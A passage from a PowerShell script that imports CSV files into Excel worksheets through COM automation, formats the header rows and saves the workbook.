			$CSVName = ($CSV.name -split "\.")[0]
			$SheetName = ($CSVName.Substring($CSVName.LastIndexOf("_")+1))
			$worksheet = $worksheets.Item($CSVSheet)
			$worksheet.Name = $SheetName
			
			# Define the connection string and the starting cell for the data
			$TxtConnector = ("TEXT;" + $CSVFullPath)
			$CellRef = $worksheet.Range("A1")

			# Build, use and remove the text file connector
			$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
			$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
			$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
			$Null = $worksheet.QueryTables.item($Connector.name).Refresh()
			$worksheet.QueryTables.item($Connector.name).delete()

			# Autofit the columns, freeze the top row
			$worksheet.UsedRange.EntireColumn.ColumnWidth = 15
			#$worksheet.Application.ActiveWindow.SplitRow = 1
			#$worksheet.Application.ActiveWindow.FreezePanes = $true

			# Set color & border to top header row
			$Selection = $worksheet.cells.Item(1,1).EntireRow
			$Selection.Interior.ColorIndex = 37
			$Null = $Selection.BorderAround(1)
			$Selection.Font.Bold=$True
			
			$CSVSheet++
		}

		# Save workbook and close Excel
		$workbooks.SaveAs($XLOutput,51)
		$workbooks.Saved = $true
		$workbooks.Close()
		$Null = [System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks)
		$Excel.Quit()
		$Null = [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
		$CSVSheet--
		Write-Host "$CSVSheet Sheet(s) Processed" -ForegroundColor Green
		
	}catch{Write-Host "Error: Is Excel Installed?" -ForegroundColor Red}
}
